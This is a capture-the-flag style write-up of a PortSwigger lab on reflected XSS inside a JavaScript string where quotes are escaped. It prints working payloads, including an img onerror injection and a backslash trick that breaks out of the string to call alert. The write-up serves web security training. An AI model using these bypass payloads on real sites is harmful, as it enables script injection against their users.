# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped), you'll learn: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101043307.png)

In here, we can see there is a search box.

Let's search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101043331.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101043357.png)

As you can see, our input is reflected to the web page.

**View source page:**
```html
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
<script>
    var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

In here, the source (input) is being parsed to the `document.write` sink.

**Let's try to inject an XSS payload:**
```html
</script><img src=errorpls onerror=alert(document.domain)>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101043835.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101043904.png)

As you can see, our `<>` is HTML encoded.

**Let's try to break out of the JavaScript code:**
```js
';alert(document.domain)//
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101044344.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101044401.png)

However, our `'` is being escaped.

**We can try to escape the `\`:**
```js
\';alert(document.domain)//
```

**So the result will be:**
```js
\\';alert(document.domain)//
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101044435.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-22/images/Pasted%20image%2020230101044444.png)

Nice!

# What we've learned:

1. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped